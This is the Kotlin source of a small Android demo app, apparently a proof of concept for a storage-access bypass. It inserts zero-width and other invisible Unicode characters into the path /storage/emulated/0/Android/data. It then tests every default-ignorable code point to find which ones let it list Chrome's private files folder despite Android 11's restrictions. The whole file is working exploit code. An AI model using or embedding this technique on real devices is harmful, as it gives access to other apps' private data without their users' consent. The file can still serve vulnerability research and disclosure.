package pers.zhc.android.demo1

import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.widget.ProgressBar
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import pers.zhc.android.demo1.databinding.ActivityMainBinding
import java.io.File
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            ToastUtils.show(this, "Please run this after Android 11 (API 30)")
            return
        }
        // request "all-files access" permission
        if (Environment.isExternalStorageManager()) {
            // granted
            initialize()
        } else {
            requestAllFilesAccessLauncher.launch(null)
        }
    }

    private fun initialize() {
        val bindings = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindings.root)

        val tryAccess = { path: String ->
            runCatching {
                ToastUtils.show(this, (File(path).list() ?: throw RuntimeException("null!")).toList().toString())
            }.onFailure {
                ToastUtils.show(this, "Error: ${it.message}")
            }
        }

        bindings.button1.setOnClickListener {
            tryAccess("/storage/emulated/0/Android/data")
        }
        bindings.button2.setOnClickListener {
            tryAccess("/storage/emulated/0/Android/data\u200b")
        }
        bindings.button3.setOnClickListener {
            tryAccess("/storage/emulated/0/Android\u200B/data/com.android.chrome/files")
        }

        bindings.button4.setOnClickListener {
            val progressBar = ProgressBar(this).apply {
                isIndeterminate = true
            }
            val dialog = MaterialAlertDialogBuilder(this)
                .setView(progressBar)
                .setCancelable(false)
                .create().also { it.show() }

            thread {
                val (chars, passedChars) = testCharacters()
                dialog.dismiss()
                ToastUtils.show(this, "${passedChars.size} of ${chars.size} passed")
            }
        }
    }

    private fun testCharacters(): Pair<List<Int>, MutableList<Int>> {
        val table = """00AD          ; Default_Ignorable_Code_Point # Cf       SOFT HYPHEN
034F          ; Default_Ignorable_Code_Point # Mn       COMBINING GRAPHEME JOINER
061C          ; Default_Ignorable_Code_Point # Cf       ARABIC LETTER MARK
115F..1160    ; Default_Ignorable_Code_Point # Lo   [2] HANGUL CHOSEONG FILLER..HANGUL JUNGSEONG FILLER
17B4..17B5    ; Default_Ignorable_Code_Point # Mn   [2] KHMER VOWEL INHERENT AQ..KHMER VOWEL INHERENT AA
180B..180D    ; Default_Ignorable_Code_Point # Mn   [3] MONGOLIAN FREE VARIATION SELECTOR ONE..MONGOLIAN FREE VARIATION SELECTOR THREE
180E          ; Default_Ignorable_Code_Point # Cf       MONGOLIAN VOWEL SEPARATOR
180F          ; Default_Ignorable_Code_Point # Mn       MONGOLIAN FREE VARIATION SELECTOR FOUR
200B..200F    ; Default_Ignorable_Code_Point # Cf   [5] ZERO WIDTH SPACE..RIGHT-TO-LEFT MARK
202A..202E    ; Default_Ignorable_Code_Point # Cf   [5] LEFT-TO-RIGHT EMBEDDING..RIGHT-TO-LEFT OVERRIDE
2060..2064    ; Default_Ignorable_Code_Point # Cf   [5] WORD JOINER..INVISIBLE PLUS
2065          ; Default_Ignorable_Code_Point # Cn       <reserved-2065>
2066..206F    ; Default_Ignorable_Code_Point # Cf  [10] LEFT-TO-RIGHT ISOLATE..NOMINAL DIGIT SHAPES
3164          ; Default_Ignorable_Code_Point # Lo       HANGUL FILLER
FE00..FE0F    ; Default_Ignorable_Code_Point # Mn  [16] VARIATION SELECTOR-1..VARIATION SELECTOR-16
FEFF          ; Default_Ignorable_Code_Point # Cf       ZERO WIDTH NO-BREAK SPACE
FFA0          ; Default_Ignorable_Code_Point # Lo       HALFWIDTH HANGUL FILLER
FFF0..FFF8    ; Default_Ignorable_Code_Point # Cn   [9] <reserved-FFF0>..<reserved-FFF8>
1BCA0..1BCA3  ; Default_Ignorable_Code_Point # Cf   [4] SHORTHAND FORMAT LETTER OVERLAP..SHORTHAND FORMAT UP STEP
1D173..1D17A  ; Default_Ignorable_Code_Point # Cf   [8] MUSICAL SYMBOL BEGIN BEAM..MUSICAL SYMBOL END PHRASE
E0000         ; Default_Ignorable_Code_Point # Cn       <reserved-E0000>
E0001         ; Default_Ignorable_Code_Point # Cf       LANGUAGE TAG
E0002..E001F  ; Default_Ignorable_Code_Point # Cn  [30] <reserved-E0002>..<reserved-E001F>
E0020..E007F  ; Default_Ignorable_Code_Point # Cf  [96] TAG SPACE..CANCEL TAG
E0080..E00FF  ; Default_Ignorable_Code_Point # Cn [128] <reserved-E0080>..<reserved-E00FF>
E0100..E01EF  ; Default_Ignorable_Code_Point # Mn [240] VARIATION SELECTOR-17..VARIATION SELECTOR-256
E01F0..E0FFF  ; Default_Ignorable_Code_Point # Cn [3600] <reserved-E01F0>..<reserved-E0FFF>"""

        val fromCodepoint = { c: Int ->
            String(Character.toChars(c))
        }

        val ranges = table.lineSequence().map {
            val range = it.split(" ")[0]
            val split = range.split("..")
            split[0].toInt(16)..(if (split.size == 2) {
                split[1].toInt(16)
            } else {
                range.toInt(16)
            })
        }
        val chars = buildList {
            ranges.forEach { r ->
                r.forEach {
                    add(it)
                }
            }
        }
        val passedChars = mutableListOf<Int>()
        chars.forEach {
            val char = fromCodepoint(it)
            val vulnerablePath = File("/storage/emulated/0/Android/data$char/com.android.chrome/files")
            val children = vulnerablePath.list()
            if (children != null) {
                passedChars += it
            }
        }

        val diff = (chars.toSet() - passedChars.toSet()).map {
            it.toString(16)
        }
        println(diff)
        return Pair(chars, passedChars)
    }

    @RequiresApi(Build.VERSION_CODES.R)
    private val requestAllFilesAccessLauncher = registerForActivityResult(
        AllFilesAccessPermissionRequestContract()
    ) {
        if (Environment.isExternalStorageManager()) {
            // permission granted
            initialize()
        } else {
            ToastUtils.show(this, R.string.please_grant_permission)
            finish()
        }
    }
}
